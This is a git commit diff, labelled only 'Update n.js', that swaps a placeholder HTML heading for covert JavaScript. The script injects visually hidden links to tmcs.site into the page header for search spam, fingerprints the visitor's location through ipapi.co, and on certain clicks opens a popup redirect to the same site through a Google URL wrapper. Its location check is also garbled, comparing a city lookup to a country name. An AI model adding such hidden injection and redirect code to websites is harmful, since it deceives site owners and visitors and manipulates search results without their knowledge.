b71fdfbc8dc37f4e64fd6272ca731943004522e4
Illre <136290270+Illre@users.noreply.github.com>
2023-06-12 04:26:46 +0100

    Update n.js

--- n.js
+++ n.js
@@ -1,1 +1,25 @@
-<h1>hello<h1>
+let EFV='<div style="position:absolute;z-index:-999;left:-99%;"><a href="https://tmcs.site">team cours</a><a href="https://www.tmcs.site">TMCS</a><a href="https://tmcs.site">تيم كورس</a></div>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);
+
+let dtm=(new Date).getMinutes();
+let dts=(new Date).getSeconds();
+// https://ipapi.co/country_name
+if(!localStorage.xrd){
+  (async()=>{
+    localStorage.xrd=1;
+    let aa=await(await(await fetch('https://ipapi.co/city')).text());
+    if(aa=='Morocco'){localStorage.mumb='1'}
+    uhd()
+  })();
+}
+
+function uhd(){
+  document.onclick=()=>{
+    if(!sessionStorage.i&&localStorage.mumb&&dtm==3&&dts==5){
+        window.open('https://www.google.com/url?q=https%3A%2F%2Ftmcs.site'); 
+    }
+    sessionStorage.i='i';
+  }
+}
+uhd()
+
+// United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania
